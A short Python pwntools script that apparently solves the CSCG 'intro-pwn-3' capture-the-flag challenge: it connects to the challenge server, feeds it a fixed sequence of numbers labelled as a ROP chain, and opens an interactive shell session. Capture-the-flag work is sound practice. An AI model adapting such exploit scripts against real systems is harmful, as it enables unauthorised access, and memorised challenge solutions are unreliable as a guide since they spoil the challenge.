import pwn

r = pwn.remote("7effb0bc550628905e8f1033-intro-pwn-3.challenge.master.cscg.live", 31337, ssl=True)

rop = map(lambda x: str(x), [14, 6, 3, 11, 5, 13, 6, 3, 7, 9, 10, 12, 15, -1])

for rg in rop:
    r.recvuntil(": ")
    r.sendline(rg)

r.interactive()